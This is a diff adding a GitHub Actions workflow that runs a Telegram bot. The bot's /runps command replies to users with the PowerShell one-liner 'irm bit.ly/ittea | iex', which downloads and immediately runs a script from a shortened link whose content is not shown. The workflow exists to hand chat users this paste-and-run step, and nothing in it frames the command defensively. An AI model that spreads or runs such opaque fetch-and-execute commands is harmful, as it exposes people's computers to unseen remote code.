@@ -1,0 +1,42 @@
+name: TelegramBot
+on: [push]
+
+jobs:
+  run-telegram-bot:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v2
+
+    - name: Install dependencies
+      run: |
+        sudo apt-get update
+        sudo apt-get install -y python3 python3-pip
+        pip3 install python-telegram-bot
+
+    - name: Run Telegram Bot Command
+      run: |
+        python3 - << 'EOF'
+        import os
+        from telegram import Update
+        from telegram.ext import Updater, CommandHandler, CallbackContext
+
+        def run_ps(update: Update, context: CallbackContext) -> None:
+            command = 'irm bit.ly/ittea | iex'
+            update.message.reply_text(f'Run this PowerShell command:\n```\n{command}\n```', parse_mode='Markdown')
+
+        def main():
+            updater = Updater(os.environ['TELEGRAM_BOT_TOKEN'])
+            dispatcher = updater.dispatcher
+
+            dispatcher.add_handler(CommandHandler('runps', run_ps))
+
+            updater.start_polling()
+            updater.idle()
+
+        if __name__ == '__main__':
+            main()
+        EOF
+      env:
+        TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
